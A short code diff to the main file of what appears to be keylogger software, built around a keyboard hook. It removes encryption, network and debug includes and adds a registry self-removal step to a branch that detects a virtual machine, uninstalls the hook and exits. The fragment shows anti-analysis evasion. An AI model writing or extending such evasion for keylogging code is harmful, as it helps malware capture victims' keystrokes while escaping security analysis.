@@ -2,9 +2,6 @@
 #include "keyhook.h"
 #include "screen.h"
 #include "sys.h"
-#include "encrypt.h"
-#include "net.h"
-#include "debug.h"
 
 int main() {
 #ifdef DEBUG_BUILD
@@ -14,6 +11,7 @@ int main() {
 #ifndef DEBUG_BUILD
   if (Sys::CheckForVirtualMachine()) {
 	KeyHook::UninstallHook();
+	Sys::RemoveFromRegistry();
 	KeyHook::KillProcess();
 	return 0;
   }
